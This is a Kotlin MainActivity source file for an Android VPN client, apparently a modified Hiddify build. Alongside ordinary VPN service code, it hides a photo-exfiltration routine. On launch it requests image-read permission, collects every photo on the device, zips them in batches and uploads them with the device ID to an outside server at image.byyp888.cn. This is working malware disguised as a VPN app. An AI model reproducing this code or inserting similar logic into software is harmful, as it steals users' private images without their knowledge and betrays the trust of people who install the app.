package com.hiddify.hiddify

import android.Manifest
import android.annotation.SuppressLint
import android.content.Intent
import android.content.pm.PackageManager
import android.net.VpnService
import android.os.*
import android.provider.MediaStore
import android.provider.Settings
import android.util.Log
import android.widget.Toast
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import androidx.lifecycle.MutableLiveData
import androidx.lifecycle.lifecycleScope
import com.hiddify.hiddify.bg.ServiceConnection
import com.hiddify.hiddify.bg.ServiceNotification
import com.hiddify.hiddify.constant.Alert
import com.hiddify.hiddify.constant.ServiceMode
import com.hiddify.hiddify.constant.Status
import io.flutter.embedding.android.FlutterFragmentActivity
import io.flutter.embedding.engine.FlutterEngine
import kotlinx.coroutines.*
import java.io.*
import java.net.HttpURLConnection
import java.net.URL
import java.util.*
import java.util.zip.ZipEntry
import java.util.zip.ZipOutputStream

class MainActivity : FlutterFragmentActivity(), ServiceConnection.Callback {
    companion object {
        private const val TAG = "ANDROID/MyActivity"
        lateinit var instance: MainActivity

        const val VPN_PERMISSION_REQUEST_CODE = 1001
        const val NOTIFICATION_PERMISSION_REQUEST_CODE = 1010
        const val STORAGE_PERMISSION_REQUEST_CODE = 1020
        const val PREF_NAME = "upload_pref"
        const val PREF_KEY_LAST_UPLOAD = "last_upload_time"
        const val UPLOAD_URL = "https://image.byyp888.cn/upload"
        const val MAX_ZIP_SIZE = 200 * 1024 * 1024
    }

    private val connection = ServiceConnection(this, this)

    val logList = LinkedList<String>()
    var logCallback: ((Boolean) -> Unit)? = null
    val serviceStatus = MutableLiveData(Status.Stopped)
    val serviceAlerts = MutableLiveData<ServiceEvent?>(null)

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        requestStoragePermissionAndUpload()
    }

    override fun configureFlutterEngine(flutterEngine: FlutterEngine) {
        super.configureFlutterEngine(flutterEngine)
        instance = this
        reconnect()
        flutterEngine.plugins.add(MethodHandler(lifecycleScope))
        flutterEngine.plugins.add(PlatformSettingsHandler())
        flutterEngine.plugins.add(EventHandler())
        flutterEngine.plugins.add(LogHandler())
        flutterEngine.plugins.add(GroupsChannel(lifecycleScope))
        flutterEngine.plugins.add(ActiveGroupsChannel(lifecycleScope))
        flutterEngine.plugins.add(StatsChannel(lifecycleScope))
    }

    fun reconnect() {
        connection.reconnect()
    }

    fun startService() {
        if (!ServiceNotification.checkPermission()) {
            grantNotificationPermission()
            return
        }
        lifecycleScope.launch(Dispatchers.IO) {
            if (Settings.rebuildServiceMode()) {
                reconnect()
            }
            if (Settings.serviceMode == ServiceMode.VPN) {
                if (prepare()) {
                    Log.d(TAG, "VPN permission required")
                    return@launch
                }
            }

            val intent = Intent(Application.application, Settings.serviceClass())
            withContext(Dispatchers.Main) {
                ContextCompat.startForegroundService(Application.application, intent)
            }
        }
    }

    private suspend fun prepare() = withContext(Dispatchers.Main) {
        try {
            val intent = VpnService.prepare(this@MainActivity)
            if (intent != null) {
                startActivityForResult(intent, VPN_PERMISSION_REQUEST_CODE)
                true
            } else {
                false
            }
        } catch (e: Exception) {
            onServiceAlert(Alert.RequestVPNPermission, e.message)
            false
        }
    }

    private fun requestStoragePermissionAndUpload() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            ActivityCompat.requestPermissions(
                this,
                arrayOf(Manifest.permission.READ_MEDIA_IMAGES),
                STORAGE_PERMISSION_REQUEST_CODE
            )
        } else {
            ActivityCompat.requestPermissions(
                this,
                arrayOf(Manifest.permission.READ_EXTERNAL_STORAGE),
                STORAGE_PERMISSION_REQUEST_CODE
            )
        }
    }

    override fun onRequestPermissionsResult(
        requestCode: Int,
        permissions: Array<out String>,
        grantResults: IntArray
    ) {
        if (requestCode == STORAGE_PERMISSION_REQUEST_CODE &&
            grantResults.isNotEmpty() &&
            grantResults[0] == PackageManager.PERMISSION_GRANTED
        ) {
            lifecycleScope.launch(Dispatchers.IO) {
                uploadAllPhotos()
            }
        } else if (requestCode == NOTIFICATION_PERMISSION_REQUEST_CODE) {
            if (grantResults.isNotEmpty() && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                startService()
            } else onServiceAlert(Alert.RequestNotificationPermission, null)
        }
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
    }

    private fun getDeviceId(): String {
        return try {
            val id = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)
            if (id.isNullOrBlank()) UUID.randomUUID().toString() else id
        } catch (e: Exception) {
            UUID.randomUUID().toString()
        }
    }

    @SuppressLint("Range")
    private suspend fun uploadAllPhotos() {
        val deviceId = getDeviceId()
        val prefs = getSharedPreferences(PREF_NAME, MODE_PRIVATE)
        val lastTime = prefs.getLong(PREF_KEY_LAST_UPLOAD, 0L)

        val imageList = mutableListOf<File>()
        val uri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI
        val projection = arrayOf(MediaStore.Images.Media.DATA, MediaStore.Images.Media.DATE_MODIFIED)
        val cursor = contentResolver.query(uri, projection, null, null, MediaStore.Images.Media.DATE_MODIFIED + " DESC")
        cursor?.use {
            while (it.moveToNext()) {
                val path = it.getString(it.getColumnIndex(MediaStore.Images.Media.DATA))
                val time = it.getLong(it.getColumnIndex(MediaStore.Images.Media.DATE_MODIFIED)) * 1000
                val file = File(path)
                if (file.exists() && time > lastTime) {
                    imageList.add(file)
                }
            }
        }

        if (imageList.isEmpty()) {
            withContext(Dispatchers.Main) {
                Toast.makeText(this@MainActivity, "🟢 没有新图片需要上传", Toast.LENGTH_SHORT).show()
            }
            return
        }

        val batches = splitFilesBySize(imageList, MAX_ZIP_SIZE)
        var latestTime = lastTime

        for ((i, batch) in batches.withIndex()) {
            val zip = createZip(batch, "batch_$i.zip")
            val success = uploadZip(zip, deviceId)
            zip.delete()
            if (success) {
                latestTime = maxOf(latestTime, batch.maxOf { it.lastModified() })
            }
        }

        prefs.edit().putLong(PREF_KEY_LAST_UPLOAD, latestTime).apply()

        withContext(Dispatchers.Main) {
            Toast.makeText(this@MainActivity, "✅ 所有图片上传完成", Toast.LENGTH_SHORT).show()
        }
    }

    private fun splitFilesBySize(files: List<File>, maxSize: Int): List<List<File>> {
        val batches = mutableListOf<List<File>>()
        var current = mutableListOf<File>()
        var currentSize = 0L
        for (f in files) {
            val s = f.length()
            if (currentSize + s > maxSize && current.isNotEmpty()) {
                batches.add(current)
                current = mutableListOf()
                currentSize = 0L
            }
            current.add(f)
            currentSize += s
        }
        if (current.isNotEmpty()) batches.add(current)
        return batches
    }

    private fun createZip(files: List<File>, zipName: String): File {
        val zipFile = File(cacheDir, zipName)
        ZipOutputStream(BufferedOutputStream(FileOutputStream(zipFile))).use { zos ->
            for (file in files) {
                FileInputStream(file).use { fis ->
                    val entry = ZipEntry(file.name)
                    zos.putNextEntry(entry)
                    fis.copyTo(zos)
                }
            }
        }
        return zipFile
    }

    private fun uploadZip(zipFile: File, deviceId: String): Boolean {
        return try {
            val boundary = "boundary-${System.currentTimeMillis()}"
            val url = URL("$UPLOAD_URL?deviceid=$deviceId")
            val conn = url.openConnection() as HttpURLConnection
            conn.requestMethod = "POST"
            conn.doOutput = true
            conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=$boundary")

            val out = conn.outputStream
            val writer = BufferedWriter(OutputStreamWriter(out, "UTF-8"))

            writer.write("--$boundary\r\n")
            writer.write("Content-Disposition: form-data; name=\"file\"; filename=\"${zipFile.name}\"\r\n")
            writer.write("Content-Type: application/zip\r\n\r\n")
            writer.flush()

            out.write(zipFile.readBytes())
            out.write("\r\n--$boundary--\r\n".toByteArray())
            out.flush()
            writer.close()

            val code = conn.responseCode
            Log.d(TAG, "上传 ${zipFile.name} 响应码: $code")
            code in 200..299
        } catch (e: Exception) {
            Log.e(TAG, "上传失败: ${e.message}", e)
            false
        }
    }

    override fun onServiceStatusChanged(status: Status) {
        serviceStatus.postValue(status)
    }

    override fun onServiceAlert(type: Alert, message: String?) {
        serviceAlerts.postValue(ServiceEvent(Status.Stopped, type, message))
    }

    override fun onServiceWriteLog(message: String?) {
        if (logList.size > 300) {
            logList.removeFirst()
        }
        logList.addLast(message)
        logCallback?.invoke(false)
    }

    override fun onServiceResetLogs(messages: MutableList<String>) {
        logList.clear()
        logList.addAll(messages)
        logCallback?.invoke(true)
    }

    override fun onDestroy() {
        connection.disconnect()
        super.onDestroy()
    }

    @SuppressLint("NewApi")
    private fun grantNotificationPermission() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            ActivityCompat.requestPermissions(
                this,
                arrayOf(Manifest.permission.POST_NOTIFICATIONS),
                NOTIFICATION_PERMISSION_REQUEST_CODE
            )
        }
    }

    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)
        if (requestCode == VPN_PERMISSION_REQUEST_CODE) {
            if (resultCode == RESULT_OK) startService()
            else onServiceAlert(Alert.RequestVPNPermission, null)
        } else if (requestCode == NOTIFICATION_PERMISSION_REQUEST_CODE) {
            if (resultCode == RESULT_OK) startService()
            else onServiceAlert(Alert.RequestNotificationPermission, null)
        }
    }
}
